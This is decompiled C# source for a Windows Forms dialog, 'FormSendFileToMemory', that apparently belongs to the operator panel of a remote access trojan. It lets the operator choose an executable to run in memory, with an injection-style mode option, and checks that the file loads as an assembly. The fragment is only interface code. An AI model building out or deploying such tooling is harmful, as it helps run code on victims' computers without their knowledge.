﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;

namespace Server
{
	// Token: 0x02000025 RID: 37
	public partial class FormSendFileToMemory : Form
	{
		// Token: 0x0600015B RID: 347 RVA: 0x000026E2 File Offset: 0x000008E2
		public FormSendFileToMemory()
		{
			this.InitializeComponent();
		}

		// Token: 0x0600015C RID: 348 RVA: 0x000026F0 File Offset: 0x000008F0
		private void SendFileToMemory_Load(object sender, EventArgs e)
		{
			this.comboBox1.SelectedIndex = 0;
			this.comboBox2.SelectedIndex = 0;
		}

		// Token: 0x0600015D RID: 349 RVA: 0x00012B00 File Offset: 0x00010D00
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
			int selectedIndex = this.comboBox1.SelectedIndex;
			if (selectedIndex == 0)
			{
				this.label3.Visible = false;
				this.comboBox2.Visible = false;
				return;
			}
			if (selectedIndex != 1)
			{
				return;
			}
			this.label3.Visible = true;
			this.comboBox2.Visible = true;
		}

		// Token: 0x0600015E RID: 350 RVA: 0x00012B54 File Offset: 0x00010D54
		private void button1_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "(*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.toolStripStatusLabel1.Text = Path.GetFileName(openFileDialog.FileName);
					this.toolStripStatusLabel1.Tag = openFileDialog.FileName;
					this.toolStripStatusLabel1.ForeColor = Color.Green;
					this.IsOK = true;
					if (this.comboBox1.SelectedIndex != 0)
					{
						goto IL_DD;
					}
					try
					{
						new ReferenceLoader().AppDomainSetup(openFileDialog.FileName);
						this.IsOK = true;
						return;
					}
					catch
					{
						this.toolStripStatusLabel1.ForeColor = Color.Red;
						ToolStripStatusLabel toolStripStatusLabel = this.toolStripStatusLabel1;
						toolStripStatusLabel.Text += " Invalid!";
						this.IsOK = false;
						return;
					}
				}
				this.toolStripStatusLabel1.Text = "";
				this.toolStripStatusLabel1.ForeColor = Color.Black;
				this.IsOK = true;
				IL_DD:;
			}
		}

		// Token: 0x0600015F RID: 351 RVA: 0x0000270A File Offset: 0x0000090A
		private void button2_Click(object sender, EventArgs e)
		{
			if (this.IsOK)
			{
				base.Hide();
			}
		}

		// Token: 0x06000160 RID: 352 RVA: 0x0000271A File Offset: 0x0000091A
		private void Button3_Click(object sender, EventArgs e)
		{
			this.IsOK = false;
			base.Hide();
		}

		// Token: 0x04000130 RID: 304
		public bool IsOK;
	}
}
